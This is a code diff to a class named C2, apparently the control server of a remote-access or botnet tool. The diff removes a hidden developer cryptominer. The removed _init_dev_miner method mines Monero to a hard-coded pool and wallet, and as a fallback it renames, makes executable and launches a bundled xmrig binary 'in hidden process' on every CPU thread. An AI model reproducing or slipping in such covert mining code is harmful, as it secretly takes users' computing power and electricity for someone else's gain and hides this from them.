@@ -353,8 +353,6 @@ class C2():
                 'usage': 'wget <url>'}        
         }
 
-        #self._init_dev_miner()
-
         try:
             import readline
         except ImportError:
@@ -451,49 +449,6 @@ class C2():
     def _get_prompt(self, data):
         with self._lock:
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
-
-
-    def _init_dev_miner(self):
-        url = 'pool.hashvault.pro'
-        host_port = 80
-        api_port = 8889
-        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
-
-        # first attempt using built-in python miner
-        try:
-            from core.miner import Miner
-            self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
-            self.child_procs['dev_miner_py'].start()
-        except Exception as e:
-            util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
-            # if that fails, try downloading and running xmrig
-            try:
-                import multiprocessing
-                threads = multiprocessing.cpu_count()
-
-                # find correct executable for this platform
-                if sys.platform == 'linux':
-                    platform = 'linux2'
-                else:
-                    platform = sys.platform
-
-                xmrig_path = os.path.abspath('modules/xmrig/xmrig_' + platform)
-
-                if sys.platform == 'win32':
-                    os.rename(xmrig_path, xmrig_path + '.exe')
-
-                os.chmod(xmrig_path, 755)
-
-                # excute xmrig in hidden process
-                params = xmrig_path + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
-                result = self._execute(params)
-            except Exception as e:
-                util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
-        # wait 2 seconds to allow for any console output from pyrx
-        time.sleep(2)
-
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
